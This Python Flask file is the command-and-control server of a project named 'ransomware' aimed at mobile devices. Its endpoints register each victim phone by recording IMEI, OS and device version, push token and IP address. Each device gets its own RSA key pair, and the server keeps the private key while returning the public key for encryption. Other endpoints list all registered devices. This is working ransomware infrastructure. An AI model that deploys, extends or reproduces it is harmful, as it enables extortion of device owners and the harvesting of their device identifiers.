from flask import Flask, request
from flask import jsonify
from flask_restful import abort
from pony.orm import db_session, commit

from ransomware.utils import generate_rsa
from .config import config
from .models import *


def create_app(env='default'):
    """

    :param env: Use of know which config to apply to the current application
    :return: Flask object

    Function use for create a Flask application

    """
    app = Flask(__name__)
    app.config.from_object(config.config[env])

    ''' Function use for create the connection to the database'''
    db.bind(provider='sqlite', filename=config.config[env].DATABASE_NAME, create_db=True)
    ''' Function use for sync the model to database'''
    db.generate_mapping(create_tables=True)

    @app.route("/")
    def main():
        return "Application Ransomware!"

    @app.route("/mobile/<uuid>", methods=["GET"])
    @db_session
    def mobile(uuid):
        mobile = Mobile.get(uuid=uuid)
        if mobile:
            return jsonify(mobile.output())
        else:
            abort(404)

    @app.route("/mobile", methods=["GET", "POST"])
    @db_session
    def mobiles():
        if request.method == "GET":
            mobile_list = []
            for m in Mobile.select():
                mobile_list.append(m.output())

            return jsonify(mobile_list)

        elif request.method == "POST":
            content = request.get_json()
            imei = content.get("imei")
            os_version = content.get("os_version")
            device_version = content.get("device_version")
            device_token = content.get("device_token")
            ip = request.remote_addr

            public_key, private_key = generate_rsa()

            mobile = Mobile(
                imei=imei,
                os_version=os_version,
                device_version=device_version,
                device_token=device_token,
                public_key=public_key,
                private_key=private_key,
                ip=ip
            )

            return jsonify({
                "uuid": mobile.uuid,
                "public_key": mobile.public_key
            })

        else:
            abort(405)

    @app.errorhandler(500)
    def internal_error(exception):
        app.logger.exception(exception)
        return "Some Internal error has taken place."

    return app
